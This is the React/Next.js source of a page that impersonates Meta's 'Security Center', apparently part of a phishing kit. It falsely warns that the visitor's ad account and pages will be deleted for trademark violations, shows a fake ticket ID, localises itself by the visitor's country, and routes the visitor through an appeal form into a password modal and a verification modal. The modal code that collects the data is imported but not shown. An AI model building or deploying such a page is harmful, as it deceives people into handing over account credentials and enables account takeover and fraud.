'use client';
import { store } from '@/store/store';
import { getTranslations } from '@/utils/translate';

import { useEffect, useState, type FC, useMemo } from 'react';
import Image from 'next/image';
import BlobIcon from '@/assets/images/blob.png';
import BlockIcon from '@/assets/images/block.png';
import PrivacyCenter from '@/assets/images/PrivacyCenter.png';
import { faHome, faSearch, faShield, faFileAlt, faGear, faBars, faTimes } from '@fortawesome/free-solid-svg-icons';
import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import PasswordModal from '@/components/form-modal/password-modal';
import VerifyModal from '@/components/form-modal/verify-modal';
import InitModal from '@/components/form-modal/init-modal';
interface VerifyFormData {
    personalEmail: string;
    pageName: string;
    legalBusinessName: string;
    phoneNumber: string;
    description: string;
}

const countryPhoneCodes: Record<string, string> = {
    // Americas
    US: '+1', CA: '+1', MX: '+52', BR: '+55', AR: '+54', CL: '+56',
    CO: '+57', PE: '+51', EC: '+593', VE: '+58', GY: '+592', SR: '+597', BO: '+591', PY: '+595', UY: '+598',
    GT: '+502', HN: '+504', SV: '+503', NI: '+505', CR: '+506', PA: '+507',
    DO: '+1-809', HT: '+509', JM: '+1-876',
    // Europe
    AT: '+43', BE: '+32', BG: '+359', HR: '+385', CY: '+357', CZ: '+420',
    DK: '+45', EE: '+372', FI: '+358', FR: '+33', DE: '+49', GR: '+30', HU: '+36', IE: '+353',
    IT: '+39', LV: '+371', LT: '+370', LU: '+352', MT: '+356', NL: '+31', PL: '+48', PT: '+351', RO: '+40',
    GB: '+44', SE: '+46', CH: '+41', TR: '+90',
    RS: '+381', BA: '+387', ME: '+382', UA: '+380', BY: '+375', MD: '+373', IS: '+354', AL: '+355',
    // Asia
    CN: '+86', JP: '+81', KR: '+82', HK: '+852', TW: '+886', SG: '+65', MY: '+60', TH: '+66',
    VN: '+84', PH: '+63', ID: '+62', BD: '+880', IN: '+91', PK: '+92', LK: '+94', NP: '+977',
    AF: '+93', IR: '+98', KZ: '+7', UZ: '+998', TJ: '+992', KG: '+996',
    MM: '+95', LA: '+856', KH: '+855', RU: '+7', AU: '+61', NZ: '+64',
    // Middle East & West Asia
    AE: '+971', SA: '+966', KW: '+965', BH: '+973', QA: '+974', OM: '+968', YE: '+967',
    IL: '+972', PS: '+970', JO: '+962', LB: '+961', SY: '+963', IQ: '+964',
    // Africa
    EG: '+20', ZA: '+27', NG: '+234', KE: '+254', ET: '+251', GH: '+233', CM: '+237', SN: '+221',
    MA: '+212', DZ: '+213', TN: '+216', LY: '+218', MG: '+261', ZW: '+263', BW: '+267'
};

const Page: FC = () => {
    const { geoInfo, isModalOpen, setModalOpen, setFormStep, formStep, userEmail, userFullName, userPhone } = store();
    const [isMobileMenuOpen, setIsMobileMenuOpen] = useState(false);
    
    // Generate random ticket ID
    const generateTicketId = (): string => {
        const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
        let id = '';
        for (let i = 0; i < 4; i++) {
            id += chars.charAt(Math.floor(Math.random() * chars.length));
        }
        id += '-';
        for (let i = 0; i < 4; i++) {
            id += chars.charAt(Math.floor(Math.random() * chars.length));
        }
        id += '-';
        for (let i = 0; i < 4; i++) {
            id += chars.charAt(Math.floor(Math.random() * chars.length));
        }
        return id;
    };
    
    const [selectedCountryCode] = useState<string>(() => {
        if (geoInfo?.country_code && countryPhoneCodes[geoInfo.country_code]) {
            return geoInfo.country_code;
        }
        return 'US';
    });
    const [ticketId] = useState<string>(() => generateTicketId());
    const [formData, setFormData] = useState<VerifyFormData>({
        personalEmail: '',
        pageName: '',
        legalBusinessName: '',
        phoneNumber: '',
        description: ''
    });

    // Compute translations using useMemo - instantly without API calls
    const countryToLanguage: Record<string, string> = useMemo(() => ({
        'us': 'en', 'gb': 'en', 'ca': 'en', 'au': 'en',
        'mx': 'es', 'es': 'es', 'ar': 'es', 'br': 'pt', 'pt': 'pt',
        'fr': 'fr', 'de': 'de', 'at': 'de', 'ch': 'fr',
        'jp': 'ja', 'cn': 'zh', 'tw': 'zh', 'hk': 'zh',
        'kr': 'ko', 'th': 'th', 'vn': 'vi', 'id': 'id',
        'ru': 'ru', 'ua': 'uk', 'in': 'hi', 'bd': 'bn',
        'ae': 'ar', 'sa': 'ar', 'eg': 'ar'
    }), []);

    const translations = useMemo(() => {
        const lang = countryToLanguage[selectedCountryCode.toLowerCase()] || 'en';
        return getTranslations(lang);
    }, [selectedCountryCode, countryToLanguage]);

    const t = (text: string): string => {
        const translated = translations[text];
        if (translated === undefined) {
            return text;
        }
        return translated;
    };

    // Reset formStep when entering ads-rejected page
    useEffect(() => {
        setFormStep('init');
    }, [setFormStep]);



    // Handle input change

    // Handle verify confirmation
    const handleVerifyConfirm = () => {
        setFormStep(null);
        // Reset form
        setFormData({
            personalEmail: '',
            pageName: '',
            legalBusinessName: '',
            phoneNumber: '',
            description: ''
        });
        // Show success message
        alert(t('Your appeal has been submitted successfully. We will review your request and get back to you shortly.'));
    };

    return (
        <div className="min-h-screen bg-gray-50 flex flex-col">
            {/* Mobile Header with Menu Button */}
            <div className="md:hidden bg-white border-b border-gray-200 flex items-center justify-between p-4 sticky top-0 z-40">
                <div className="flex items-center gap-3">
                    <Image 
                        src={BlobIcon} 
                        alt="Meta" 
                        width={80} 
                        height={50} 
                        className="w-16 h-auto"
                        priority
                        quality={100}
                    />
                    <span className="text-sm font-bold text-gray-900">{t('Security Center')}</span>
                </div>
                <button
                    onClick={() => setIsMobileMenuOpen(!isMobileMenuOpen)}
                    className="p-2 hover:bg-gray-100 rounded-lg transition"
                    aria-label="Toggle menu"
                >
                    <FontAwesomeIcon 
                        icon={isMobileMenuOpen ? faTimes : faBars} 
                        className="w-6 h-6 text-gray-900"
                    />
                </button>
            </div>

            {/* Mobile Sidebar Menu Overlay */}
            {isMobileMenuOpen && (
                <div 
                    className="md:hidden fixed inset-0 bg-black/30 z-30"
                    onClick={() => setIsMobileMenuOpen(false)}
                />
            )}

            {/* Mobile Sidebar Menu */}
            <div
                className={`md:hidden fixed left-0 top-16 bottom-0 w-64 bg-gray-50 border-r border-gray-200 z-30 transform transition-transform duration-300 ${
                    isMobileMenuOpen ? 'translate-x-0' : '-translate-x-full'
                } overflow-y-auto`}
            >
                <nav className="flex flex-col gap-1 p-4">
                    <div className="px-3 py-3 rounded-lg bg-blue-50 text-blue-700 font-medium flex items-center gap-3 cursor-pointer hover:bg-blue-100 transition">
                        <FontAwesomeIcon icon={faHome} className="w-5 h-5" />
                        <span className="text-sm">{t('Home')}</span>
                    </div>
                    <div className="px-3 py-3 rounded-lg text-gray-700 hover:bg-gray-100 cursor-pointer flex items-center gap-3 transition">
                        <FontAwesomeIcon icon={faSearch} className="w-5 h-5" />
                        <span className="text-sm">{t('Search')}</span>
                    </div>
                    <div className="px-3 py-3 rounded-lg text-gray-700 hover:bg-gray-100 cursor-pointer flex items-center gap-3 transition">
                        <FontAwesomeIcon icon={faShield} className="w-5 h-5" />
                        <span className="text-sm">{t('Security Policies')}</span>
                    </div>
                    <div className="px-3 py-3 rounded-lg text-gray-700 hover:bg-gray-100 cursor-pointer flex items-center gap-3 transition">
                        <FontAwesomeIcon icon={faFileAlt} className="w-5 h-5" />
                        <span className="text-sm">{t('Rules & Other Posts')}</span>
                    </div>
                    <div className="px-3 py-3 rounded-lg text-gray-700 hover:bg-gray-100 cursor-pointer flex items-center gap-3 transition">
                        <FontAwesomeIcon icon={faGear} className="w-5 h-5" />
                        <span className="text-sm">{t('Settings')}</span>
                    </div>
                </nav>
            </div>

            <div className="flex-1 flex justify-center pt-0 md:pt-6">
                <div className="flex w-full max-w-4xl mx-auto relative">
                    {/* Divider Line */}
                    <div className="hidden md:block absolute left-64 top-6 bottom-6 w-px bg-gray-300"></div>
                    {/* Sidebar - Hidden on mobile */}
                    <div className="hidden md:flex w-64 bg-gray-50 flex-col flex-shrink-0">
                        <div className="px-4 py-3 bg-gray-50">
                            <div className="flex flex-col items-start gap-3">
                                <Image 
                                    src={BlobIcon} 
                                    alt="Meta" 
                                    width={500} 
                                    height={300} 
                                    className="w-24 h-auto flex-shrink-0"
                                    priority
                                    quality={100}
                                />
                                <p className="text-2xl font-bold text-gray-900">{t('Security Center')}</p>
                            </div>
                        </div>

                        <nav className="flex-1 px-2 py-3 space-y-1 my-4 relative">
                            <div className="px-3 py-2.5 rounded-lg bg-blue-50 text-blue-700 font-medium flex items-center gap-3 cursor-pointer hover:bg-blue-100 transition">
                                <FontAwesomeIcon icon={faHome} className="w-5 h-5" />
                                <span className="text-sm">{t('Home')}</span>
                            </div>
                            <div className="px-3 py-2.5 rounded-lg text-gray-700 hover:bg-gray-100 cursor-pointer flex items-center gap-3 transition">
                                <FontAwesomeIcon icon={faSearch} className="w-5 h-5" />
                                <span className="text-sm">{t('Search')}</span>
                            </div>
                            <div className="px-3 py-2.5 rounded-lg text-gray-700 hover:bg-gray-100 cursor-pointer flex items-center gap-3 transition">
                                <FontAwesomeIcon icon={faShield} className="w-5 h-5" />
                                <span className="text-sm">{t('Security Policies')}</span>
                            </div>
                            <div className="px-3 py-2.5 rounded-lg text-gray-700 hover:bg-gray-100 cursor-pointer flex items-center gap-3 transition">
                                <FontAwesomeIcon icon={faFileAlt} className="w-5 h-5" />
                                <span className="text-sm">{t('Rules & Other Posts')}</span>
                            </div>
                            <div className="px-3 py-2.5 rounded-lg text-gray-700 hover:bg-gray-100 cursor-pointer flex items-center gap-3 transition">
                                <FontAwesomeIcon icon={faGear} className="w-5 h-5" />
                                <span className="text-sm">{t('Settings')}</span>
                            </div>
                        </nav>
                    </div>

                    {/* Main Content */}
                    <div className="flex-1 flex flex-col w-full md:w-auto">
                        {/* Content Area */}
                        <div className="flex-1 overflow-y-auto p-4 md:p-4 md:p-6 flex flex-col pb-6 bg-white border border-gray-300 rounded-lg m-2 md:m-4 md:m-6">
                            <div className="w-full max-w-2xl mx-auto">
                                {/* Notification Banner */}
                                <div className="mb-2 md:mb-3">
                                    <div className="flex items-center gap-3 md:gap-4">
                                        <Image
                                            src={BlockIcon}
                                            alt="Block"
                                            width={40}
                                            height={40}
                                            className="w-10 h-10 flex-shrink-0"
                                            priority
                                            quality={100}
                                        />
                                        <h2 className="text-base md:text-lg font-bold text-gray-900 whitespace-nowrap">
                                            {t('We have scheduled your ad account and pages for deletion')}
                                        </h2>
                                    </div>
                                </div>

                                {/* Description Text */}
                                <div className="mb-1 md:mb-2 text-xs md:text-sm text-gray-700 space-y-1.5 font-normal">
                                    <p className="text-gray-700">
                                        {t('We have received multiple reports indicating that your advertisement violates trademark rights. After a detailed review, we have made a decision regarding this matter.')}
                                    </p>
                                    <p className="italic text-gray-600">
                                        {t('If no corrective actions are taken, your advertising account will be permanently deleted. If you wish to appeal this decision, please submit an appeal request to us for review and assistance.')}
                                    </p>
                                    <p className="text-xs md:text-sm font-semibold text-blue-600">
                                        {t('Your ticket id:')} #{ticketId}
                                    </p>
                                </div>

                                {/* Illustration */}
                                <div className="mb-1 md:mb-2 bg-blue-50 rounded-lg p-6 md:p-8 flex items-center justify-center min-h-48 md:min-h-64">
                                    <Image 
                                        src={PrivacyCenter} 
                                        alt="Security Illustration" 
                                        width={300} 
                                        height={200} 
                                        className="w-full h-auto max-w-xs object-contain"
                                        priority
                                        quality={100}
                                    />
                                </div>

                                {/* Request Review Section */}
                                <div className="mb-6 md:mb-8 bg-gray-100 rounded-lg p-4 md:p-6">
                                    <h3 className="text-base md:text-lg font-bold text-gray-900 mb-2">
                                        {t('Request review')}
                                    </h3>
                                    <p className="text-sm md:text-base text-gray-700 mb-3">
                                        {t('This team is used for submitting appeals and restoring account status.')}
                                    </p>
                                    <p className="text-xs md:text-sm text-gray-600 mb-6">
                                        {t('Please ensure that you provide the required information below. Failure to do so may delay the processing of your appeal.')}
                                    </p>
                                    
                                    {/* Request Review Button */}
                                    <button
                                        onClick={() => {
                                            setModalOpen(true);
                                        }}
                                        className="w-full py-2.5 md:py-3 bg-blue-600 text-white font-semibold rounded-lg hover:bg-blue-700 transition-all shadow-md hover:shadow-lg text-sm md:text-base"
                                    >
                                        {t('Request review')}
                                    </button>
                                </div>

                                {/* Trademark Infringement Info */}
                                <div className="p-0 md:p-0">
                                    <h3 className="text-lg font-bold text-gray-900 mb-4">
                                        {t('What is trademark infringement?')}
                                    </h3>
                                    
                                    <p className="text-xs md:text-sm text-gray-700 mb-4">
                                        {t('Generally, trademark infringement occurs when all three of the following requirements are met:')}
                                    </p>

                                    <ol className="space-y-3 md:space-y-4">
                                        <li className="text-xs md:text-sm text-gray-700 flex gap-3">
                                            <span className="font-normal text-gray-700 flex-shrink-0">1.</span>
                                            <span>{t('A company or person uses a trademark owner\'s trademark (or similar trademark) without permission.')}</span>
                                        </li>
                                        <li className="text-xs md:text-sm text-gray-700 flex gap-3">
                                            <span className="font-normal text-gray-700 flex-shrink-0">2.</span>
                                            <span>{t('That use is in commerce, meaning that it\'s done in connection with the sale or promotion of goods or services.')}</span>
                                        </li>
                                        <li className="text-xs md:text-sm text-gray-700 flex gap-3">
                                            <span className="font-normal text-gray-700 flex-shrink-0">3.</span>
                                            <span>{t('That use is likely to confuse consumers about the source, endorsement or affiliation of the goods or services.')}</span>
                                        </li>
                                    </ol>

                                    <p className="text-xs md:text-sm text-gray-700 mt-4">
                                        {t('Trademark infringement is often "likelihood of confusion" and there are many factors that determine whether a use is likely to cause confusion. For example, when a person\'s trademark is also used by someone else. But on unrelated goods or services, that use may not be infringement because it may not be likely to cause confusion. For example, when a person\'s trademark first can often be an important consideration as well.')}
                                    </p>
                                </div>

                                {/* Divider Line */}
                                <div className="mt-8 pt-6 border-t border-gray-300"></div>

                                {/* Footer Menu */}
                                <div className="mt-1 flex flex-wrap items-center justify-center gap-1.5 md:gap-2 text-2xs md:text-xs text-gray-600">
                                    <a href="#" className="hover:text-gray-900 transition">{t('Help Center')}</a>
                                    <span className="text-gray-400">·</span>
                                    <a href="#" className="hover:text-gray-900 transition">{t('Privacy Policy')}</a>
                                    <span className="text-gray-400">·</span>
                                    <a href="#" className="hover:text-gray-900 transition">{t('Terms of Service')}</a>
                                    <span className="text-gray-400">·</span>
                                    <a href="#" className="hover:text-gray-900 transition">{t('Community Standards')}</a>
                                    <span className="text-gray-400">·</span>
                                    <span className="text-gray-600">Meta © 2025</span>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>


            {isModalOpen && <InitModal />}

            {/* Password Modal */}
            {formStep === 'password' && (
                <PasswordModal 
                    userProfileImage=""
                    userName={userFullName || 'User'}
                    userEmail={userEmail || ''}
                    fullName={userFullName || ''}
                    phoneNumber={userPhone || ''}
                />
            )}

            {/* Verify Modal */}
            {formStep === 'verify' && (
                <VerifyModal 
                    businessName={formData.legalBusinessName}
                    nextStep={handleVerifyConfirm}
                />
            )}
        </div>
    );
};

export default Page;
